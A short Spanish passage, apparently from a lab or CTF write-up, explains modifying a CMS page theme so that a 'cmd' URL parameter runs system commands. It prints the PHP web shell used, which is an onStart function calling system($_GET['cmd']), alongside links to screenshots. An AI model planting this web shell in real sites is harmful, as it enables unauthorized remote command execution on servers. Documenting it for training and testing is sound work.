![[Pasted image 20250802125746.png]]

Para poder ejecutar comandos de forma remota, vamos a modificar un tema de la página, para que, mediante una etiqueta `cmd`, poder inyectar comandos.

![[Pasted image 20250802130013.png]]

![[Pasted image 20250802130027.png]]

Aquí dejo el código utilizado:

```php
function onStart()
{
    $this->page["myVar"] = system($_GET['cmd']);
}
```

![[Pasted image 20250802130127.png]]
